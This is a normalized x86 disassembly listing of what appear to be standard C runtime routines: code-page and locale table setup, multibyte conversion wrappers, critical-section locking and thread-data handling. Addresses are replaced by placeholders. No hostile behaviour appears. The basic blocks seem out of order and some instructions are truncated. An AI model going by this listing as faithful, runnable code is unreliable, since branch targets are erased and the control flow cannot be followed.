cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_40f402
push [ ebx ]
call sub_40f402
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_40f402
push [ esi + 0x84 ]
call sub_40f402
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40f402
push [ esi + 0x84 ]
call sub_41b54e
pop ecx
pop ecx
push eax
call sub_40f402
pop ecx
push eax
call sub_40f402
push [ esi + 0x84 ]
call sub_41b64a
pop ecx
pop ecx
sub_415e20
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_415ebb
push 0xc
push r--data
call sub_411bb0
call sub_41686e
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_415f37
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415f2e
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41686e
mov esi [ eax + 0x6c ]
mov eax esi
call sub_411bf5
retn
push 0x20
call sub_4107c1
sub_415f37
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_415c36
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_415e20
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_415cc6
pop ecx
sub_415fa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_415fda
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_410368
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_416046
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_414c70
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4160af
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_41bb1d
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_416d6c
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_416d6c
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_41623d
push 0xc
push r--data
call sub_411bb0
call sub_41686e
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4162d9
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_411bf5
retn
push 0x20
call sub_4107c1
cmp esi rw-data
je r-xdata
push esi
call sub_40f402
pop ecx
sub_4162e2
push 0x10
push r--data
call sub_411bb0
or edi 0xffffffff
call sub_41686e
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_41623d
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_415fda
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_411b1b
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_411bf5
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_416490
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_412060
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40f402
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_40f402
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_416df0
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41645a
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_40f402
pop ecx
sub_416490
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_415fda
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_416046
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_414c70
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_415fa0
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_4160af
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_414c70
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_416046
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_415fa0
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_416685
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_410368
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_4173a6
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_419cb5
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
movzx eax ax
jmp r-xdata
add cx 0x20
movzx eax [ ebp - 0x4 ]
movzx eax [ ebp + 0x8 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ esi + 0x94 ]
movzx eax [ eax + ecx ]
movzx eax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
pop esi
je r-xdata
movzx eax ax
jmp r-xdata
movzx eax ax
jmp r-xdata
sub_416737
push 0x8
push r--data
call sub_411bb0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_411bf5
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_40f402
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_40f402
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_40f402
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_40f402
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_40f402
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_40f402
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_40f402
pop ecx
push 0xd
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_40f402
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416859
push 0xc
call sub_416df0
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416865
push esi
call sub_40f402
pop ecx
push edi
call sub_415e20
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40f402
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_415cc6
pop ecx
sub_416886
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_4158c9
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_411ad1
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_4158e8
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_40f402
pop ecx
xor esi esi
push 0x0
push esi
call sub_4168f5
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4168f5
push 0x8
push r--data
call sub_411bb0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416996
push 0xc
call sub_416df0
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_415c36
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41699f
call sub_411bf5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_4169a8
call sub_4108a0
call sub_416f1f
test eax eax
jne r-xdata
push sub_416737
call sub_41588c
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_416a1e
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_411ad1
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_416a1e
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_4158e8
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_4168f5
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_416a3b
push 0x8
push r--data
call sub_411bb0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_411bf5
retn
push 0xc
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_415f37
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416a84
sub_416a8d
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_410368
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_416b3c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41bb1d
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_416b3c
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_410368
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_416b83
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40eb9e
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_410a6b
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_418bc6
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_40f43a
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_4173e0
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_418bc6
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_418bc6
add esp 0x18
jmp r-xdata
push esi
call sub_410a6b
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_40f43a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_4173e0
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_416d6c
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_410368
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_416b83
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_416db0
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_416dd0
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_416df0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_416e78
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4107c1
sub_416e24
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_40f402
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_416e78
push 0x8
push r--data
call sub_411bb0
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_411da5
push 0x1e
call sub_411e02
push 0xff
call sub_4107ab
xor eax eax
inc eax
push 0x18
call sub_411b1b
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_412060
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_40f402
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_411bf5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416f16
sub_416f1f
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_416f70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
